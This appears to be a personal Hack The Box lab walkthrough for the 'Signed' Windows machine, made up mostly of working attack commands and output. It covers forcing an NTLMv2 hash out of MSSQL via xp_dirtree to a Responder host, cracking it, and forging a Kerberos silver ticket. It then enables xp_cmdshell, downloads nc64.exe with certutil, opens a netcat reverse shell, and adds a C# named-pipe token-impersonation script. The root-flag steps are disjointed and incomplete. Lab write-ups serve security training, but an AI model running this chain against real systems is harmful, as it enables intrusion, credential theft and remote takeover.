# HTB Labs - Signed

## Start

`As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH`

## NMAP scan

```
nmap -A 10.129.242.173 -o signed_nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-15 14:38 EST
Nmap scan report for 10.129.242.173
Host is up (0.044s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.129.242.173:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.242.173:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-01-15T19:35:32
|_Not valid after:  2056-01-15T19:35:32
|_ssl-date: 2026-01-15T19:38:48+00:00; -47s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
|_clock-skew: mean: -47s, deviation: 0s, median: -47s

TRACEROUTE (using port 1433/tcp)
HOP RTT      ADDRESS
1   55.27 ms 10.10.14.1
2   56.33 ms 10.129.242.173

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.97 seconds
```
Port:
`1433/tcp  open  ms-sql-s`

Machine:
`Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
FQDN = DC01.signed.htb`

## Pre-Auth Enumeration

This didnt work:

```
nxc mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH'
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [-] SIGNED.HTB\scott:Sm230#C5NatH (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')

```

Local Auth
```
nxc mssql --local-auth 10.129.242.173 -u scott -p 'Sm230#C5NatH'
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [+] DC01\scott:Sm230#C5NatH
```

## SQL Post-Auth Enumeration

```
nxc mssql --local-auth 10.129.242.173 \
  -u scott -p 'Sm230#C5NatH' \
  -q "SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;"
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [+] DC01\scott:Sm230#C5NatH 
MSSQL       10.129.242.173  1433   DC01             is_sysadmin:0
```

Results:

sysadmin = 0  → xp_cmdshell cannot be enabled directly ***

Check xp_dirtree permissions

```
nxc mssql --local-auth signed \
  -u scott -p 'Sm230#C5NatH' \
  -q "SELECT * FROM fn_my_permissions('master..xp_dirtree','OBJECT');"
```

## Net-NTLMv2 Capture via Forced UNC Path

Create a share directory (attacker)

```
mkdir -p /tmp/smbshare
```

Run responder (with sudo)

```
sudo responder -I tun0
```

Trigger outbound auth from SQL Server:

```
nxc mssql --local-auth 10.129.242.173 \
  -u scott -p 'Sm230#C5NatH' \
  -q "EXEC master..xp_dirtree '\\\\10.10.14.129\\smbshare'"
```

`\\\\10.10.14.129\\smbshare` -> my ip

`local-auth 10.129.242.173` -> image 

<img width="947" height="659" alt="image" src="https://github.com/user-attachments/assets/eceb173d-cc4e-498d-9234-38a3061ac99b" />


Result:

<img width="935" height="135" alt="image" src="https://github.com/user-attachments/assets/db84a920-771b-4626-a3b6-98d5c7fb57b9" />

Responder:
```
SMB] NTLMv2-SSP Client   : 10.129.242.173
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:031d659682533089:812C4B6CFF97D161270BEEFDF2482292:01010000000000000089F2D22E86DC01251CADEF79DF670C0000000002000800410051003400380001001E00570049004E002D0045005800350039003200450049004F0053005100420004003400570049004E002D0045005800350039003200450049004F005300510042002E0041005100340038002E004C004F00430041004C000300140041005100340038002E004C004F00430041004C000500140041005100340038002E004C004F00430041004C00070008000089F2D22E86DC010600040002000000080030003000000000000000000000000030000078B13FCEE5ACBEE58FE551BC7545C9465148B3F7EA4A05E49BD8A798916FC0090A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100320039000000000000000000 
```

## Hash Cracking 

```
sudo nano hash.txt

mssqlsvc::SIGNED:031d659682533089:812C4B6CFF97D161270BEEFDF2482292:01010000000000000089F2D22E86DC01251CADEF79DF670C0000000002000800410051003400380001001E00570049004E002D0045005800350039003200450049004F0053005100420004003400570049004E002D0045005800350039003200450049004F005300510042002E0041005100340038002E004C004F00430041004C000300140041005100340038002E004C004F00430041004C000500140041005100340038002E004C004F00430041004C00070008000089F2D22E86DC010600040002000000080030003000000000000000000000000030000078B13FCEE5ACBEE58FE551BC7545C9465148B3F7EA4A05E49BD8A798916FC0090A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100320039000000000000000000

```

Crack with Hashcat (5600 = NetNTLMv2):

```
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt --username --status
```

Running into problems with Hashcat so used john instead:

```
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt --username --status --force -D 1
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

No devices found/left.

Started: Thu Jan 15 15:02:48 2026
Stopped: Thu Jan 15 15:02:48 2026

┌──(ClearLotus㉿kali)-[~/signed]
└─$ cp hash.txt john_hash.txt

┌──(ClearLotus㉿kali)-[~/signed]
└─$ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt john_hash.txt
Created directory: /home/ClearLotus/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
purPLE9795!@     (mssqlsvc)     
1g 0:00:00:03 DONE (2026-01-15 15:04) 0.2680g/s 1202Kp/s 1202Kc/s 1202KC/s purcitititya..puppys50
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably                        
Session completed.
```

`purPLE9795!@     (mssqlsvc)`



## Restart Here: 

```
impacket-mssqlclient 'SIGNED/mssqlsvc:purPLE9795!@'@10.129.242.173 -windows-auth
```

Command To check if the user has sysadmin rights

```
SELECT IS_SRVROLEMEMBER('sysadmin');

```


## NTHASH Dumping in MSSQL

Dump Nthash with command:

```
echo -n 'purPLE9795!@' | iconv -f UTF-8 -t UTF-16LE | openssl md4
```

```
IT_RID=1105

MSSQLSVC_RID=1103

DOMSID=’S-1-5-21-4088429403-1159899800-2753317549′

Command:SELECT SUSER_SID('SIGNED\IT');

```

```
SQL (SIGNED\mssqlsvc  guest@master)> SELECT name, SUSER_SID(name) AS sid FROM sys.syslogins WHERE name LIKE 'SIGNED\%';
name                                                                          sid   
-------------------   -----------------------------------------------------------   
SIGNED\IT             b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'   

SIGNED\Domain Users   b'0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000'   

SQL (SIGNED\mssqlsvc  guest@master)> 
```

Maybe?
```
nxc mssql 10.10.11.90 -u 'mssqlsvc' -p 'pur*******' \
  -q "SELECT name, master.dbo.fn_varbintohexstr(sid) AS sidhex FROM sys.server_principals;"
```

<img width="747" height="506" alt="image" src="https://github.com/user-attachments/assets/5afc9a23-5571-450b-b4d2-bc8fc0a48917" />


## Silver Ticket 

```
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc  -domain-sid S-1-5-21-4088429403-1159899800-2753317549   -domain signed.htb   -spn mssqlsvc/dc01.signed.htb   -groups 512,1105,513   -user-id 1103   mssqlsvc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache

┌──(ClearLotus㉿kali)-[~/signed]
└─$ export KRB5CCNAME=$(pwd)/mssqlsvc.ccache                                                                        

┌──(ClearLotus㉿kali)-[~/signed]
└─$ impacket-mssqlclient -k mssqlsvc@dc01.signed.htb -no-pass -windows-authImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)> 
```

## Enabling xp_cmdshell

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell';
```


## Getting Shell

Download nc.64

```
wget https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe -O nc64.exe
```
Start server: 

```
python3 -m http.server 8000
```

Inside your SQL shell:

```
EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.129:8000/nc64.exe C:\ProgramData\nc64.exe';
```

Confirm file exists on target

```
EXEC xp_cmdshell 'dir C:\ProgramData\';
```

Start listener on KALI:
```
nc -lvnp 9999
```

Trigger the Reverse Shell:
```
EXEC xp_cmdshell 'C:\ProgramData\nc64.exe 10.10.14.129 9999 -e cmd.exe';
```

<img width="651" height="164" alt="image" src="https://github.com/user-attachments/assets/844281b5-886e-4724-b1d1-deaf3a8af0bd" />

## User.txt

```
C:\Users\mssqlsvc>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BED4-436E

 Directory of C:\Users\mssqlsvc

10/02/2025  08:27 AM    <DIR>          .
10/02/2025  08:27 AM    <DIR>          ..
10/02/2025  08:50 AM    <DIR>          Desktop
10/02/2025  08:27 AM    <DIR>          Documents
09/14/2018  11:19 PM    <DIR>          Downloads
09/14/2018  11:19 PM    <DIR>          Favorites
09/14/2018  11:19 PM    <DIR>          Links
09/14/2018  11:19 PM    <DIR>          Music
09/14/2018  11:19 PM    <DIR>          Pictures
09/14/2018  11:19 PM    <DIR>          Saved Games
09/14/2018  11:19 PM    <DIR>          Videos
               0 File(s)              0 bytes
              11 Dir(s)   6,382,608,384 bytes free

C:\Users\mssqlsvc>cd Desktop
cd Desktop

C:\Users\mssqlsvc\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BED4-436E

 Directory of C:\Users\mssqlsvc\Desktop

10/02/2025  08:50 AM    <DIR>          .
10/02/2025  08:50 AM    <DIR>          ..
01/15/2026  11:34 AM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   6,382,608,384 bytes free

C:\Users\mssqlsvc\Desktop>cat user.txt
cat user.txt
'cat' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\mssqlsvc\Desktop>type user.txt
type user.txt
b2750e12a3495234d48d102ea6b32aed

C:\Users\mssqlsvc\Desktop>
```


## Root Flag

from the xp_commandshell
```
SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS t;
```


```
whoami /priv
```

```
C:\Users>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                        State   
============================= ================================== ========
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process Disabled
SeChangeNotifyPrivilege       Bypass traverse checking           Enabled 
SeCreateGlobalPrivilege       Create global objects              Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set     Disabled

```

Change to powershell 

```
powershell
```

```
mkdir namedpipe && cd namedpipe                      
nano Invoke-NamedPipe-Impersonation.ps1
```

powershell script:

```
C:\Users>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763

C:\Users>
```

```
C:\Users>Get-NtToken
Get-NtToken
'Get-NtToken' is not recognized as an internal or external command,
operable program or batch file.
```




```
Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Principal;

public class PipeServer {
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentThread();

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine,
        int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    public static void StartServer() {
        var pipe = new NamedPipeServerStream("pwnpipe", PipeDirection.InOut, 1,
            PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
        Console.WriteLine("[*] Waiting for connection on \\\\.\\pipe\\pwnpipe ...");
        pipe.WaitForConnection();
        Console.WriteLine("[+] Client connected!");

        if (!ImpersonateNamedPipeClient(pipe.SafePipeHandle.DangerousGetHandle())) {
            Console.WriteLine("[-] Failed to impersonate client.");
            return;
        }

        IntPtr token;
        if (!OpenThreadToken(GetCurrentThread(), 0x0002 | 0x0008 | 0x0010, false, out token)) {
            Console.WriteLine("[-] Failed to open thread token.");
            return;
        }

        IntPtr dupToken;
        if (!DuplicateToken(token, 2, out dupToken)) {
            Console.WriteLine("[-] Failed to duplicate token.");
            return;
        }

        RevertToSelf();

        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        si.cb = Marshal.SizeOf(si);

        string cmd = "cmd.exe";
        bool result = CreateProcessWithTokenW(dupToken, 0, null, cmd, 0, IntPtr.Zero, null, ref si, out pi);
        if (result) {
            Console.WriteLine("[+] Spawned SYSTEM shell!");
        } else {
            Console.WriteLine("[-] Failed to spawn process.");
        }
    }
}
"@ -Language CSharp

[PipeServer]::StartServer()
```

```
python3 -m http.server 8000
```

On shell:

```
cd C:\ProgramData
certutil -urlcache -split -f http://10.10.14.129:8000/Invoke-NamedPipe-Impersonation.ps1 pwnpipe.ps1
```

Now on another shell in the same box step: 

```
 sudo nc -lnvp 5555
listening on [any] 5555 ...                              
connect to [10.10.14.129] from (UNKNOWN) [10.129.242.173] 56359                                                   
Microsoft Windows [Version 10.0.17763.7314]              
(c) 2018 Microsoft Corporation. All rights reserved.     
                                                         
C:\Windows\system32>
```

```
└─$ impacket-mssqlclient -k mssqlsvc@dc01.signed.htb -no-pass -windows-auth                                       
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies                                        
                                                         
[*] Encryption required, switching to TLS                
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master                                                     
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english                                                       
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192                                                      
[*] INFO(DC01): Line 1: Changed database context to 'master'.                                                     
[*] INFO(DC01): Line 1: Changed language setting to us_english.                                                   
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)     
[!] Press help for extra shell commands                  
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC xp_cmdshell 'C:\ProgramData\nc64.exe 10.10.14.129 5555 -e cmd.exe';       
                                                         
```










